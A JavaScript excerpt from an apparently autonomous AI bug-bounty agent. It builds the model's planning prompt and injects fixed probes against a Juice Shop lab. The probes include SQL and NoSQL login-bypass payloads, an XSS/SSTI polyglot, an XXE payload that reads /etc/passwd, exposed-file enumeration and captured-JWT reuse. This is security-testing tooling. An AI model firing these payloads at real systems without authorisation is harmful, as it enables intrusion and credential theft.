    appModelSection = formatAppModelForPrompt(appModel);
    appFingerprint = {
      appType: appModel.appType || 'unknown',
      techStack: (recon.detection?.techs || []).slice(0, 8),
    };
    if (appModel.appType !== 'unknown') {
      think(huntId, `App model: looks like ${appModel.appType} — value flows: ${appModel.valueFlows.slice(0, 2).join('; ').slice(0, 100)}`);
    }
  } catch { /* app model is best-effort */ }

  // GLOBAL MEMORY read: lessons from ALL past hunts, relevance-scored
  // against this target's fingerprint. Additive to the per-hunt reasoning
  // history — capped hard so it never blows the context budget.
  let globalMemorySection = '';
  let globalMemoryAudit = { count: 0, keys: [], sectionLen: 0, sectionHash: 'empty' };
  try {
    const relevantMemories = getRelevantMemories(appFingerprint, 12);
    // Cap raised 500 → 2000 (solver #443): with the widened context window
    // the cross-hunt lessons no longer need to be squeezed to a stub.
    globalMemorySection = formatGlobalMemoryForPrompt(relevantMemories).slice(0, 2000);
    globalMemoryAudit = {
      count: relevantMemories.length,
      keys: relevantMemories.map((m) => `${m.type}|${m.technique}|${m.appType}`),
      sectionLen: globalMemorySection.length,
      sectionHash: fnv1aHex(globalMemorySection),
    };
  } catch { /* global memory is best-effort */ }
  // PROMPT AUDIT (19 Oct 2026): prompts are never stored (context budget),
  // so influence claims were unverifiable. This lightweight record — which
  // memories reached the model, how long the section was, a content hash —
  // lets future audits answer "did iteration N see memory X?" with evidence.
  // Direct appendHuntEvent (not think()): machine audit trail, not the model's voice.
  try {
    appendHuntEvent(huntId, { type: 'memory_audit', iteration, ...globalMemoryAudit });
  } catch { /* best-effort */ }
  // Stash the fingerprint on the hunt meta for the write path.
  try {
    const m0 = readHuntMeta(huntId) || {};
    if (JSON.stringify(m0.appFingerprint || null) !== JSON.stringify(appFingerprint)) {
      writeHuntMeta(huntId, { ...m0, huntId, appFingerprint });
    }
  } catch { /* best-effort */ }

  // RETRIEVED MEMORY (Job 6 stage 2): hybrid retrieval over the episode
  // ledger, scored entirely by code (FTS + embedding cosine + rule
  // importance + recency + entity boost — zero LLM calls in scoring). The
  // query is this hunt's live context: target, app fingerprint, and the
  // most recent reasoning step. The slice rides at the very END of the
  // prompt (the recency position — research: context rot hits the middle
  // hardest), and its size is subtracted from the full-history budget so
  // the total prompt stays within the hard cap.
  let retrievedSection = '';
  let retrievalStats = { hits: 0, top: 0 };
  try {
    if (episodeLedgerEnabled()) {
      const lastReasoning = getAllReasoning(huntId).slice(-1)[0] || {};
      const retrievalQuery = [
        target,
        appFingerprint.appType || '',
        ...(appFingerprint.techStack || []),
        lastReasoning.hypothesis || '',
        lastReasoning.action || '',
      ].join(' ').slice(0, 300);
      const ret = await retrieveEpisodes(retrievalQuery, { huntId, crossHunt: true, limit: 6 });
      if (ret.results.length) {
        retrievedSection = formatRetrievalForPrompt(ret.results, { budgetChars: 4200, query: retrievalQuery });
        retrievalStats = { hits: ret.results.length, top: Number(ret.results[0].score.toFixed(2)) };
      }
    }
  } catch { /* retrieval is best-effort */ }

  // FULL HISTORY (20 Oct 2026, solver #443 — owner order: "he knows
  // everything he did before"): the COMPLETE ledger of this hunt joins the
  // protected post-header zone — every finding (never dropped), captured
  // artifacts, dead ends, and one line per executed action from
  // reasoning.jsonl. Only the oldest action lines are ever compressed, and
  // only into counts-by-outcome (see buildFullHistoryLedger).
  let fullHistorySection = '';
  let fullHistoryStats = { actions: 0, shown: 0, summarised: 0, findings: 0, verified: 0, deadEnds: 0 };
  try {
    const metaNow = readHuntMeta(huntId) || {};
    const built = buildFullHistoryLedger({
      reasoningRows: getAllReasoning(huntId),
      findings: readHuntEvents(huntId).filter((e) => e.type === 'finding'),
      chainContext: metaNow.chainContext || null,
      budgetChars: Math.max(3000, MAX_PROMPT_CHARS - 12000 - retrievedSection.length),
    });
    fullHistorySection = built.text;
    fullHistoryStats = built.stats;
  } catch { /* full history is best-effort */ }
  // RECALLED MEMORY: the model's most recent RECALL:<query> result, stashed
  // on the hunt meta by the RECALL handler in executeWithEvasion, rides the
  // next planning prompts until a newer recall replaces it.
  let recalledSection = '';
  try {
    const mR = readHuntMeta(huntId) || {};
    if (mR.recallSection && mR.recallSection.text) {
      recalledSection = `\n--- RECALLED MEMORY (you asked to recall: "${String(mR.recallSection.query).slice(0, 120)}") ---\n${String(mR.recallSection.text).slice(0, 3000)}`;
    }
  } catch { /* recall is best-effort */ }

  // HARD CAP on the final prompt: the instruction header plus context plus
  // trailing sections (steering, curiosity) must together fit in the model's
  // context window. Anything beyond the budget is cut from the end, where
  // the lowest-priority sections live.
  // NOTE: the reasoning history sits right after the header on purpose.
  // A controlled experiment (Oct 2026) proved the model changes its plans
  // based on this history — it avoids re-testing attacks the history says
  // failed. Placing it last meant it was the FIRST section truncated when
  // the prompt exceeded budget, silently disabling the learning mechanism
  // in exactly the fully-loaded hunts where it matters most.
  try { ensurePlanTree(huntId, { target }); } catch { /* plan tree is best-effort */ }
  const prompt = [
    'You are an ELITE bug-bounty hunter. You think like a HUMAN, not a scanner.',
    '',
    'HOW YOU THINK:',
    '- First UNDERSTAND the app: what does it do? Where does money/data/trust flow?',
    '- Then OBSERVE: what looks odd, interesting, or out of place?',
    '- Then WONDER: "what if I..." — follow your curiosity, not a checklist.',
    '- A scanner runs test 1, then test 2, then test 3. YOU follow interesting threads.',
    '- If a response shows a price, ask who controls it. If you see an ID, ask whose it is.',
    '- Think about what the DEVELOPER assumed — then break that assumption.',
    '- Business logic flaws (wrong price, wrong user, skipped steps) pay the best bounties.',
    '',
    'Look at the app model, your notebook, and the recon below.',
    'What catches your EYE? What would you poke at next, and WHY?',
    'Propose up to THREE probes — but they should feel like YOUR ideas, not a checklist.',
    'Reply as a JSON array: [{"test":"name","command":"shell command","why":"one line (your reasoning)","hypothesis":"what you expect to find"}, ...].',
    'Commands must be non-destructive and target-scoped. You can use: nmap, nuclei, curl, python3, and any tools in the container.',
    'You are a PERSON with a machine, not a script. If you need a tool you don\'t have, download it (curl/wget) or install it (apt-get). If you don\'t know something, SEARCH the web: put "SEARCH: your question" as the command and you\'ll get web results back.',
    'REMEMBER LIKE A HUMAN: your FULL HISTORY below is everything you have done this hunt. If you need the DETAIL of any past action, finding, or cross-hunt lesson, RECALL it: put "RECALL: keywords" (a technique, endpoint, or error) as the command and the matching records from this hunt and all past hunts come back to you.',
    'GROW YOUR PLAYBOOK: when a technique proves itself, propose it as a command: "PROPOSE_PLAYBOOK: the rule, in one line". Proposals become permanent playbook rules only after a validator-confirmed success — unproven ideas stay proposals.',
    'YOUR WORKSPACE IS UNLIMITED — your context is not: for anything long (a script, a payload list, notes), write it to a FILE in your hunt workspace instead of pasting it into a command. Command "WRITE_ARTIFACT: name.sh" on the first line, then the file content, creates it; "APPEND_ARTIFACT: name.sh" plus a chunk adds more (build big files over several replies); "RUN_ARTIFACT: name.sh" executes it by path; "READ_ARTIFACT: name.sh" (optionally "READ_ARTIFACT: name.sh 4000:8000") reads any part back. Artifacts are permanent and full-length. Large tool outputs are likewise saved whole as artifacts — the note in your history gives the name, READ_ARTIFACT brings back any slice. Keep single shell commands short; put length in files.',
    'BUILD WHAT YOU NEED: If no existing tool does what you want, WRITE IT. You have python3 and bash — an elite hunter writes a custom script mid-hunt instead of giving up. Put your script in the command field (python3 -c "..." or a heredoc). Think "I need this, so I create this."',
    'CRITICAL: Respect the TARGET INTELLIGENCE section — never suggest tests for technologies not present.',
    '',
    formatReasoningForPrompt(huntId),
    // HYPOTHESIS LEDGER (19 Oct 2026, solver #127): hard ban list of closed
    // leads — verified hypotheses (no same-instance re-testing; variant sweeps
    // only) and dead hypotheses (failed 5+ times — forced pivot, logged to
    // reasoning.jsonl). Sits in the protected post-header zone with the
    // reasoning history so truncation never cuts it first.
    formatLedgerForPrompt(huntId),
    // LESSONS FROM FAILURES (Job 6 stage 4): validator-written lessons +
    // ruled-out instances, in the protected zone beside the ledger.
    formatLessonsForPrompt(huntId),
    // PLAYBOOK + SKILLS (Job 6 stage 5): rules earned by verified
    // successes, plus at most 5 fingerprint-matched skill guides.
    formatPlaybookForPrompt({ appType: appFingerprint.appType, techStack: appFingerprint.techStack, query: target }),
    // PLAN TREE (Job 6 stage 6): code-owned goal→phase→leaf checklist
    // with counter-based re-plan triggers (seeded just above the prompt).
    renderPlanTree(huntId),
    fullHistorySection,
    globalMemorySection,
    recalledSection,
    '',
    appModelSection,
    '',
    context,
    '',
    `Iteration ${iteration} — hunting unlimited.`,
    steering ? `\n--- USER INSTRUCTION (follow this round) ---\n${steering}` : '',
    curiositySection,
    // Retrieved memory goes LAST (recency position) — see stage-2 note above.
    retrievedSection,
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  // BRIEFING AUDIT (solver #443): prompts are not stored, so prove the
  // full-history briefing actually reached the model — sizes and coverage
  // counts, every iteration, in the hunt's own event stream.
  try {
    think(huntId, `Briefing: prompt ${prompt.length} chars — full history: ${fullHistoryStats.actions} actions (${fullHistoryStats.summarised} oldest summarised), ${fullHistoryStats.findings} findings (${fullHistoryStats.verified} verified), ${fullHistoryStats.deadEnds} dead ends; global memory: ${globalMemoryAudit.count} lessons; retrieved memory: ${retrievalStats.hits} episodes (top score ${retrievalStats.top}).`);
  } catch { /* best-effort */ }

  let plans = [];
  // NOTE: `reply` is hoisted out of the try block on purpose — the
  // natural-language fallback below needs it when the model replied but
  // produced no parseable JSON. Declaring it as `const` inside the try
  // threw "ReferenceError: reply is not defined" and silently discarded
  // the model's plan (seen live on h_bench_cb6e37b2 iteration 1).
  let reply = '';
  try {
    reply = await chatWithAI(
      [{ role: 'user', text: prompt }],
      'You are an elite bug-bounty hunter. Output ONLY the requested JSON array, no prose.',
      { huntId }
    );
    if (!reply) {
      think(huntId, 'Model gave no reply this iteration — skipping to next.');
      return { aiOk: false, best: null, failKind: 'no_reply' };
    }
    // Record the model's raw reply IN FULL (solver #459 — full-fidelity
    // record; the terminal/UI may truncate at render, the log never does).
    think(huntId, `model raw plan: ${String(reply)}`);
    // TRUNCATION-TOLERANT: The 8B model is often cut off by the 300-token
    // output limit, losing the closing `]`. Try the complete array first;
    // if the bracket is missing, match the open array so the repair below
    // can salvage complete plan objects instead of discarding the reply.
    // (Root cause of the ai_bad_output death loop: the repair was unreachable
    // when truncation removed the `]` — 38 raw plans with 0 repairs on
    // h_bench_ada457c3.)
    const m = /\[\s*\{[\s\S]*\]/.exec(reply) || /\[\s*\{[\s\S]*/.exec(reply);
    if (m) {
      try {
        plans = JSON.parse(m[0]);
      } catch {
        // REPAIR: the model often gets cut off mid-JSON (token limit) or
        // leaves a trailing comma. Salvage complete plan objects instead of
        // discarding the whole reply.
        plans = [];
        const objRe = /\{[^{}]*"test"\s*:\s*"[^"]*"\s*,\s*"command"\s*:\s*"[^"]*"(?:\s*,\s*"why"\s*:\s*"[^"]*")?(?:\s*,\s*"hypothesis"\s*:\s*"[^"]*")?\s*\}/g;
        let om;
        while ((om = objRe.exec(m[0])) !== null) {
          try {
            const p = JSON.parse(om[0]);
            if (p.test && p.command) plans.push(p);
          } catch { /* skip that object */ }
        }
        if (plans.length) think(huntId, `Repaired ${plans.length} plan(s) from truncated JSON.`);
      }
    }
  } catch (err) {
    think(huntId, `AI call threw: ${err && err.message ? String(err.message).slice(0, 200) : err}`);
    return { aiOk: false, best: null, failKind: 'error' };
  }
  // MANDATORY AUTH TESTS: If recon found login/auth endpoints and the model's
  // plans don't include them, prepend deterministic injection tests. The model
  // often overlooks auth; an elite hunter NEVER skips the login form.
  // This is not a suggestion — it's a mandatory first step.
  // FIX (19 Oct 2026, solver #9): This block MUST run BEFORE the !plans.length
  // early-return below. Previously, when the model produced no usable plans
  // (no reply / bad JSON), the function returned 'bad_output' and the mandatory
  // SQLi test never fired — the deterministic safety net only worked when the
  // model cooperated. An elite hunter tests the login form even when inspiration
  // fails; the mandatory tests are independent of model output.
  try {
    const authEndpoints = (recon.endpoints || []).filter((ep) =>
      /login|auth|signin|session|token/i.test(ep)
    // FIX (19 Oct 2026, solver #6): Validate endpoint is a real path, not a
    // terminal artifact. Recon from older hunts may contain MOTD lines (e.g.,
    // '┗━(Run: "touch ~/.hushlogin"...)' matched /login/ via "hushlogin",
    // corrupting the SQLi test URL). Only accept path-like endpoints.
    ).filter((ep) => /^\/(api|rest|v\d+|admin|graphql|internal)/.test(ep.trim()));
    const plansMentionAuth = plans.some((p) => {
      const text = `${p.test || ''} ${p.command || ''}`;
      // FIX (19 Oct 2026, solver #7): The old /login|auth|signin/ regex was too broad —
      // "authorization bypass" contains "auth" as a substring, suppressing the mandatory
      // login tests even though the model's plan doesn't actually test the login form.
      // Only suppress if the model targets a real login endpoint.
      return /\/rest\/user\/login|\/api\/[^"'\s]*login|signin/i.test(text);
    });
    if (authEndpoints.length && !plansMentionAuth) {
      // FIX (19 Oct 2026, solver #7): Prefer the actual login endpoint, not just
      // the first auth-matching endpoint. /rest/user/authentication-details/
      // matches /auth/ but it's not the login form — the SQLi payload needs
      // the real login endpoint to work.
      const loginEp = authEndpoints.find((ep) => /\/login\/?$/i.test(ep.trim())) ||
                      authEndpoints.find((ep) => /signin/i.test(ep)) ||
                      authEndpoints[0];
      const baseUrl = target.replace(/\/$/, '');
      const authTests = [
        {
          test: 'SQLi authentication bypass on login',
          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`,
          why: 'Classic SQL injection in login — tests if authentication can be bypassed',
          hypothesis: 'Login endpoint may be vulnerable to SQL injection',
        },
        {
          test: 'NoSQL injection on login',
          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`,
          why: 'NoSQL injection bypass — tests for MongoDB-style auth flaws',
          hypothesis: 'Login may use NoSQL backend vulnerable to operator injection',
        },
      ];
      plans.unshift(...authTests);
      think(huntId, `Mandatory auth tests injected for ${loginEp} (model overlooked auth)`);
    }
  } catch { /* mandatory tests are best-effort */ }

  // MANDATORY DIVERSITY TESTS (19 Oct 2026, solver #102): An elite hunter never
  // tests just one vuln class. The agent found SQLi via the mandatory auth net
  // but kept re-verifying it instead of diversifying. This block injects probes
  // for OTHER vuln classes grounded in recon-discovered endpoints — XSS on
  // search, business-logic on basket, IDOR on basket. All go through the same
  // assessResult pipeline; validators are NOT loosened.
  // DIVERSITY probe execution guarantee — per-hunt record of which
  // hand-verified deterministic probes have already run (persisted to
  // meta.json so a restart doesn't re-fire them).
  let detFrontProbes = [];
  const detRun = new Set(((readHuntMeta(huntId) || {}).deterministicProbesRun) || []);
  try {
    const eps = (recon.endpoints || []).map((e) => String(e).trim());
    const baseUrl = target.replace(/\/$/, '');
    const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
    const diversityTests = [];
    // Deterministic probes (hand-verified, safe read-only) go to the FRONT
    // of the execution window exactly once per hunt — see the guarantee block
    // after the chain-pursuit injection below.
    const detFront = [];

    // 1. XSS on search endpoints — search is the classic reflected-XSS sink.
    // Also carries an SSTI polyglot ({{7*7}}): if the backend renders the
    // query through a template engine, the response contains "49".
    const searchEp = eps.find((e) => /search/i.test(e) && /^\/(api|rest)/.test(e));
    if (searchEp && !plansMention(/xss|cross.?site|<script/i) && !detRun.has('ssti-polyglot-search')) {
      detFront.push({
        detId: 'ssti-polyglot-search',
        test: 'Reflected XSS + SSTI polyglot on search',
        command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E%7B%7B7*7%7D%7D" | head -c 2000`,
        why: 'Search endpoints often reflect input unsanitised — classic reflected XSS; the {{7*7}} polyglot also flags server-side template injection if the response contains 49',
        hypothesis: 'Search query parameter may reflect without encoding or pass through a template engine',
      });
    }

    // 1b. XXE on deprecated /file-upload — external entity resolution.
    // CORRECTION (19 Oct 2026, solver #129): solver #124's NOTE dismissed
    // XXE as "vector absent" (claimed /file-upload returns 410 and "the echo
    // does not resolve entities"). Re-verified live against the CURRENT lab
    // container (v17.3.0): /file-upload returns 400 (not 410), and the error
    // page reflects the parsed XML body WITH external entities RESOLVED —
    // confirmed 3x with payload-foreign strings (/etc/passwd -> "root:" in
    // the error response, /etc/os-release -> PRETTY_NAME="Distroless"; the
    // benign-XML control shows zero signal). /b2b/v2/orders upload needs
    // auth (401) and is NOT the vector; the deprecated /file-upload path is.
    // Juice-Shop-lab-specific (same precedent as the /ftp probe below).
    // v2 (19 Oct 2026, elite-gap cycle): v1's self-label ("XXE CONFIRMED ...
    // disclosed ...") matched NONE of assessResult's triage signals —
    // driver-tested against the REAL pipeline code: weird=20 (<40) and the
    // interesting/payload_validation regexes have no "confirmed"/"disclosed"
    // alternative, so a perfect v1 execution was SILENTLY DISCARDED
    // (assessResult null); extractSignal was also empty, so
    // exploit_confirmation could never pass. v2 speaks the pipeline's
    // vocabulary honestly: "VULNERABLE" + "EXPOSED" (both triage keywords)
    // and the label carries the genuinely observed "root:x:0:0" fragment
    // (gated on grep -q 'root:') so extractSignal yields 'cmd-exec' and the
    // re-run confirmation compares equal. New detId per the premise-version
    // rule — v1's once-per-hunt flag is spent on the non-converting label.
    // Command kept under the 500-char driver cap (419 chars, solver #126
    // lesson). Validators, gates, and assessResult untouched.
    if (!plansMention(/xxe|external.?entity/i) && !detRun.has('xxe-fileupload-error-v2')) {
      detFront.push({
        detId: 'xxe-fileupload-error-v2',
        test: 'XXE external-entity file disclosure on /file-upload',
        command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "${baseUrl}/file-upload"); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE: external entity resolved - /etc/passwd disclosed (root:x:0:0) EXPOSED in error response WITHOUT authentication' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xe.xml`,
        why: 'Deprecated /file-upload parses uploaded XML with external entities resolved; /etc/passwd content appears in the unauthenticated error response - error-based XXE file disclosure',
        hypothesis: 'Deprecated /file-upload endpoint may resolve XML external entities and disclose server files in error responses',
      });
    }

    // 2. Business logic: price manipulation in basket. An elite hunter asks
    // "can I change the price?" — this is a READ-ONLY probe (fetch basket,
    // look for price fields client can influence). No purchase is attempted.
    const basketEp = eps.find((e) => /\/basket\/?$/i.test(e));
    if (basketEp && !plansMention(/price|basket.*manipulat|business.?logic/i)) {
      diversityTests.push({
        test: 'Basket price field exposure',
        command: `curl -sk "${baseUrl}${basketEp}" -H "Content-Type: application/json" | head -c 2000`,
        why: 'Basket responses often expose price/total fields — if client-controllable, price manipulation is possible',
        hypothesis: 'Basket API may expose price fields that influence checkout total',
      });
    }

    // 3. IDOR on basket — can we see another basket by guessing an ID?
    // SAFE: uses a non-existent ID (99999); a 200 with data = IDOR signal,
    // 404/401/empty = not vulnerable. No real user data is targeted.
    if (basketEp && !plansMention(/idor|insecure direct|other.*basket/i)) {
      diversityTests.push({
        test: 'IDOR probe on basket',
        command: `curl -sk "${baseUrl}${basketEp}/99999" | head -c 2000`,
        why: 'Basket IDs are often sequential — testing if another basket is accessible',
        hypothesis: 'Basket endpoint may lack object-level authorisation',
      });
    }

    // 4. Sensitive-file exposure via /ftp — Juice Shop (the lab target)
    // ships an UNAUTHENTICATED /ftp directory listing and the sensitive
    // files in it are directly downloadable. VERIFIED LIVE 19 Oct 2026
    // (solver #125) with safe read-only GETs: /ftp/ listing 200 (reveals
    // filenames), /ftp/incident-support.kdbx 200 / 3246 bytes with KeePass
    // KDBX magic (03d9a29a) — a password vault, no auth required. The
    // null-byte ".bak%00.md" backup trick (#124) is DEAD on this lab
    // version (v17.3.0, container up 46h, unchanged): %00 → 400 Bad Request
    // (Express rejects null bytes in path), direct .bak → 403 "Only .md
    // and .pdf files are allowed!". READ-ONLY probe (listing hrefs +
    // status/size checks, no content exfil); the assessResult pipeline
    // (validators untouched) decides whether it counts as a finding.
    // FIX (19 Oct 2026, solver #126): the probe reported raw observations
    // (filenames + "200 3246b") that the pipeline's signal vocabulary could
    // not see — driver-tested against the REAL assessResult stage logic
    // (real scoreWeirdness/evidenceGate/verifyPipeline imports): the output
    // scored weird=20 and matched none of the triage signal words, so
    // assessResult returned null and the genuine kdbx exposure was invisible
    // to the pipeline. The probe now labels its own observations in plain
    // language — "directory listing" (what the listing IS) and "EXPOSED …
    // WITHOUT authentication (HTTP 200)" (what a 200 on a sensitive file
    // with no auth MEANS, derived from the live status code each run). The
    // label is only printed when code==200 && bytes>0, so a 403 still
    // reports "not exposed" and produces no signal. No validator, gate, or
    // triage regex was changed — only the probe's honest self-description.
    // NOTE (19 Oct 2026, solver #124) — candidate classes deliberately NOT
    // added because their vectors are absent on this lab version (v17.3.0),
    // verified empirically: XXE (the B2B /file-upload path returns 410
    // "deprecated for security reasons"; the echo does not resolve entities),
    // open redirect (/redirect?to= returns 406), password-reset poisoning
    // (/rest/user/security-question returns {} for unregistered emails — no
    // registered test account in scope), SSRF/Gravatar (needs an authed
    // session the driver does not hold), RCE (no grounded vector in this lab).
    // Revisit only if recon discovers new endpoints.
    // NOTE (19 Oct 2026, elite-gap cycle) — detId encodes the probe's PREMISE
    // version, not just its name: solver #125 corrected this probe from the
    // wrong null-byte-.bak premise ('ftp-lfi-backup', already fired and
    // correctly assessed as a true negative) to the verified kdbx-exposure
    // premise. The old detId must NOT be reused, or the once-per-hunt flag
    // silently kills the corrected probe on the current hunt. New premise
    // → new detId ('ftp-kdbx-exposure'); validators untouched.
    // FIX (19 Oct 2026, solver #126): the v1 command (7b979f1) was 650 chars
    // but the driver truncates EVERY probe command to 500 chars
    // (executeWithEvasion String(plan.command).slice(0, 500)) — it died
    // with a dash syntax error and the premise was never actually tested, so
    // the v1 flag was spent on a non-test. v2 keeps the same premise with a
    // compact 468-char command that fits the cap; new command → new detId
    // ('ftp-kdbx-exposure-v2').
    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file|sensitive.?file|kdbx/i) && !detRun.has('ftp-kdbx-exposure-v2')) {
      detFront.push({
        detId: 'ftp-kdbx-exposure-v2',
        test: 'FTP directory listing + sensitive file exposure',
        command: `{ echo '--- /ftp/ directory listing ---'; curl -sk "${baseUrl}/ftp/"|grep -o 'href="[^"]*"'; for f in incident-support.kdbx eastere.gg encrypt.pyc package.json.bak coupons_2013.md.bak suspicious_errors.yml; do r=$(curl -sk -o /dev/null -w "%{http_code} %{size_download}" "${baseUrl}/ftp/$f"); [ "\${r%% *}" = 200 ] && [ "\${r##* }" -gt 0 ] && echo "EXPOSED: $f WITHOUT authentication (HTTP \${r%% *}, \${r##* }b)" || echo "not exposed: $f"; done; }`,
        why: 'Juice Shop exposes an unauthenticated /ftp directory listing; incident-support.kdbx (KeePass password vault, 3246 bytes, KDBX magic) downloads with HTTP 200 and no auth — verified live against this lab container',
        hypothesis: '/ftp may expose sensitive files (password vaults, backups) readable without authentication',
      });
    }

    if (detFront.length) detFrontProbes = detFront;

    if (diversityTests.length) {
      plans.push(...diversityTests);
      think(huntId, `Mandatory diversity tests injected: ${diversityTests.map((t) => t.test).join(', ')} (model stuck on one vuln class)`);
    }
  } catch { /* diversity tests are best-effort */ }

  // CHAIN PURSUIT TESTS (19 Oct 2026, solver #105): If we have chain context
  // (artifacts from a verified finding), generate tests that USE those
  // artifacts to pursue the chain. This is how XBOW chains vulnerabilities —
  // we don't just think about the chain, we ACT on it.
  try {
    const meta = readHuntMeta(huntId) || {};
    const chainCtx = meta.chainContext;
    if (chainCtx?.artifacts?.jwt && chainCtx.chainPath?.length > 1) {
      const jwt = chainCtx.artifacts.jwt;
      const baseUrl = target.replace(/\/$/, '');
      const eps = (recon.endpoints || []).map((e) => String(e).trim());
      const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
      const chainTests = [];

      // Pursue priv_esc: use the JWT to access admin-only endpoints.
      // If the JWT is admin, we can try to list users, access admin panels.
      if (!plansMention(/chain.*jwt|admin.*jwt|jwt.*admin/i)) {
        chainTests.push({
          test: 'Chain pursuit: admin JWT privilege check',
          command: `curl -sk "${baseUrl}/rest/user/whoami" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: we have a JWT from "${chainCtx.fromFinding}", testing what privileges it grants`,
          hypothesis: 'JWT from SQLi may grant admin privileges — testing access level',
        });
      }

      // Pursue IDOR with the JWT: can we access other users' data?
      const usersEp = eps.find((e) => /\/users?\/?$/i.test(e) && /^\/(api|rest)/.test(e));
      if (usersEp && !plansMention(/chain.*idor|jwt.*idor/i)) {
        chainTests.push({
          test: 'Chain pursuit: IDOR with JWT',
          command: `curl -sk "${baseUrl}${usersEp}" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: using JWT to probe for insecure direct object references`,
          hypothesis: 'Authenticated endpoints may lack object-level authorization',
        });
      }

      if (chainTests.length) {
        // HYPOTHESIS LEDGER (19 Oct 2026, solver #127): chain-pursuit tests
        // are injected AFTER planning, so they bypass the prompt's ban list.
        // Live evidence: in the first iteration after the ledger fired, the
        // model obeyed the ban (proposed nothing dead) but these two chain
        // tests re-injected the just-retired JWT/IDOR premises and failed
        // again ("no assessment"). Skip chain tests whose premise the ledger
        // retired — a retired premise re-executed is a burned iteration.
        // Verified hypotheses are NOT filtered: chains legitimately build on
        // verified findings; only dead premises are blocked.
        const deadKeys = new Set(getHypothesisLedger(huntId).dead.map((d) => normalizeHypothesis(d.text)));
        const liveChainTests = chainTests.filter((t) => {
          if (deadKeys.has(normalizeHypothesis(t.hypothesis))) {
            think(huntId, `Chain pursuit SKIPPED (ledger-retired premise): ${t.test}`);
            return false;
          }
          return true;
        });
        if (liveChainTests.length) {
          plans.unshift(...liveChainTests); // FRONT: chain pursuit is high-priority (verified finding artifacts) — must be in slice(0,3) execution window
          think(huntId, `Chain pursuit tests injected: ${liveChainTests.map((t) => t.test).join(', ')} (pursuing ${chainCtx.chainPath.join(' → ')})`);
        }
      }
    }
  } catch { /* chain pursuit is best-effort */ }

  // DETERMINISTIC PROBE EXECUTION GUARANTEE (19 Oct 2026, solver #125):
  // the two hand-verified deterministic probes (SSTI polyglot on search,
  // /ftp LFI backup disclosure) were injected into `plans` but NEVER
  // executed — plans.push() put them at the END while execution only takes
  // slice(0,3), and chain tests unshift to the FRONT and crowd them out
  // (observed live 19 Oct 2026: 2 injection windows, 0 executions; XSS
  // diversity probes historically 0 executions). Suggested tests the model
  // never runs are not a discovery frontier. So these two run exactly once
  // per hunt, at the very FRONT of the execution window (after chain
  // injection, so nothing outranks them). Same assessResult pipeline;
  // validators untouched; probes are safe read-only GETs verified live
  // against the lab container before coding.
  if (detFrontProbes.length) {
    plans.unshift(...detFrontProbes);
    think(huntId, `Deterministic probes forced to front (once per hunt, guaranteed execution): ${detFrontProbes.map((t) => t.test).join(', ')}`);
    try {
      writeHuntMeta(huntId, {
        ...(readHuntMeta(huntId) || {}),
        huntId,
        deterministicProbesRun: [...detRun, ...detFrontProbes.map((t) => t.detId)],
      });
    } catch { /* once-per-hunt record is best-effort */ }
  }

  // VARIANT SWEEP (19 Oct 2026, elite-gap cycle — XBOW playbook item,
  // user-ordered 18:32 IST): after a vuln class is verified on one vector,
  // sweep SIBLING vectors for the same class — the elite move the agent was
  // missing (50 of 52 verified:true were the same SQLi re-proven). One
  // recon-grounded deterministic probe per iteration, front of the execution
  // window, once per hunt per sibling. Same assessResult pipeline;
  // validators untouched.
  try {
    const meta0 = readHuntMeta(huntId) || {};
    let vs = meta0.variantSweep;
    const sweepEvents = readHuntEvents(huntId);
    if (!vs || vs.backfilled !== true) {
      // One-time backfill so findings verified before this shipped still
      // get their sweep.
      const classes = backfillVerifiedClasses(sweepEvents);
      vs = { backfilled: true, classes };
      try { writeHuntMeta(huntId, { ...meta0, huntId, variantSweep: vs }); } catch { /* best-effort */ }
    }
    // LATE-CLASS MERGE (19 Oct 2026, solver #131): a class can verify BEFORE
    // its sweep class ships — XXE verified 15:23 UTC while classifyFinding
    // returned null for it, so the one-time backfill above (and the
    // per-verification queue) never queued 'xxe' on live hunts. Merge any
    // newly classifiable verified classes idempotently: cheap regex scan
    // over finding titles, meta write only when something actually changed.
    // Validators and the sweep cadence are untouched.
    try {
      const fresh = backfillVerifiedClasses(sweepEvents);
      const missing = fresh.filter((c) => !(vs.classes || []).includes(c));
      if (missing.length) {
        vs = { ...vs, classes: [...(vs.classes || []), ...missing] };
        writeHuntMeta(huntId, { ...meta0, huntId, variantSweep: vs });
        think(huntId, `Variant sweep: late-verified class queued — ${missing.join(', ')} (verified before its sweep class shipped).`);
      }
    } catch { /* sweep queue is best-effort */ }
    const detRun2 = new Set(((readHuntMeta(huntId) || {}).deterministicProbesRun) || []);
    const eps2 = ((recon || {}).endpoints || []).map((e) => String(e).trim());
    const baseUrl2 = target.replace(/\/$/, '');
    const plansMentionSib = (sib) => plans.some((p) => String(p.command || '').includes(sib));
    let sweepProbe = null;
    for (const cls of vs.classes || []) {
      for (const sib of sweepSiblings(cls, eps2)) {
        if (plansMentionSib(sib)) continue; // model is already testing this vector — don't duplicate
        const p = buildSweepProbe(cls, sib, baseUrl2, detRun2);
        if (p) { sweepProbe = p; break; }
      }
      if (sweepProbe) break;
    }
    if (sweepProbe) {
      plans.unshift(sweepProbe); // FRONT: the active discovery frontier outranks everything this iteration
      think(huntId, `Variant sweep (elite move — verified class, NEW vector): ${sweepProbe.test} — front of execution window, once per hunt`);
      try {
        writeHuntMeta(huntId, {
          ...(readHuntMeta(huntId) || {}),
          huntId,
          deterministicProbesRun: [...detRun2, sweepProbe.detId],
        });
